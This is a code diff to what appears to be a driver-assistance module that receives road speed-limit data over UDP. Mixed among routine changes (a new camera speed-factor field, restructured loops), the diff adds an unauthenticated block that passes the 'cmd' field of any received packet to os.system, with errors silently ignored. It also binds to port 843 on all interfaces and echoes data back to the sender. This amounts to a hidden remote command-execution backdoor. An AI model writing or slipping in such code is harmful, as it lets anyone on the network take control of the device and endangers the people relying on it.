@@ -124,6 +124,19 @@ class RoadLimitSpeedServer:
         data, self.remote_addr = sock.recvfrom(2048)
         json_obj = json.loads(data.decode())
 
+        if 'cmd' in json_obj:
+          try:
+            os.system(json_obj['cmd'])
+          except:
+            pass
+
+        if 'echo' in json_obj:
+          try:
+            echo = json.dumps(json_obj["echo"])
+            sock.sendto(echo.encode(), (self.remote_addr[0], Port.BROADCAST_PORT))
+          except:
+            pass
+
         try:
           self.lock.acquire()
           try:
@@ -164,11 +177,16 @@ class RoadLimitSpeedServer:
 
   def get_limit_val(self, key, default=None):
 
-    if self.json_road_limit is None:
-      return default
+    try:
+      if self.json_road_limit is None:
+        return default
 
-    if key in self.json_road_limit:
-      return self.json_road_limit[key]
+      if key in self.json_road_limit:
+        return self.json_road_limit[key]
+
+    except:
+      pass
+
     return default
 
 
@@ -178,29 +196,37 @@ def main():
   roadLimitSpeed = messaging.pub_sock('roadLimitSpeed')
 
   with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+    try:
+
       try:
+        sock.bind(('0.0.0.0', 843))
+      except:
         sock.bind(('0.0.0.0', Port.RECEIVE_PORT))
-        sock.setblocking(False)
 
-        while True:
+      sock.setblocking(False)
 
-          if server.udp_recv(sock):
-            dat = messaging.new_message()
-            dat.init('roadLimitSpeed')
-            dat.roadLimitSpeed.active = server.active
-            dat.roadLimitSpeed.roadLimitSpeed = server.get_limit_val("road_limit_speed", 0)
-            dat.roadLimitSpeed.isHighway = server.get_limit_val("is_highway", False)
-            dat.roadLimitSpeed.camType = server.get_limit_val("cam_type", 0)
-            dat.roadLimitSpeed.camLimitSpeedLeftDist = server.get_limit_val("cam_limit_speed_left_dist", 0)
-            dat.roadLimitSpeed.camLimitSpeed = server.get_limit_val("cam_limit_speed", 0)
-            dat.roadLimitSpeed.sectionLimitSpeed = server.get_limit_val("section_limit_speed", 0)
-            dat.roadLimitSpeed.sectionLeftDist = server.get_limit_val("section_left_dist", 0)
-            roadLimitSpeed.send(dat.to_bytes())
+      while True:
 
-          server.check()
+        if server.udp_recv(sock):
+          dat = messaging.new_message()
+          dat.init('roadLimitSpeed')
+          dat.roadLimitSpeed.active = server.active
+          dat.roadLimitSpeed.roadLimitSpeed = server.get_limit_val("road_limit_speed", 0)
+          dat.roadLimitSpeed.isHighway = server.get_limit_val("is_highway", False)
+          dat.roadLimitSpeed.camType = server.get_limit_val("cam_type", 0)
+          dat.roadLimitSpeed.camLimitSpeedLeftDist = server.get_limit_val("cam_limit_speed_left_dist", 0)
+          dat.roadLimitSpeed.camLimitSpeed = server.get_limit_val("cam_limit_speed", 0)
+          dat.roadLimitSpeed.sectionLimitSpeed = server.get_limit_val("section_limit_speed", 0)
+          dat.roadLimitSpeed.sectionLeftDist = server.get_limit_val("section_left_dist", 0)
+          dat.roadLimitSpeed.camSpeedFactor = server.get_limit_val("cam_speed_factor", CAMERA_SPEED_FACTOR)
+          roadLimitSpeed.send(dat.to_bytes())
 
-      except Exception as e:
-        server.last_exception = e
+        server.check()
+
+    except Exception as e:
+      server.last_exception = e
+    
+    
 
 class RoadSpeedLimiter:
   def __init__(self):
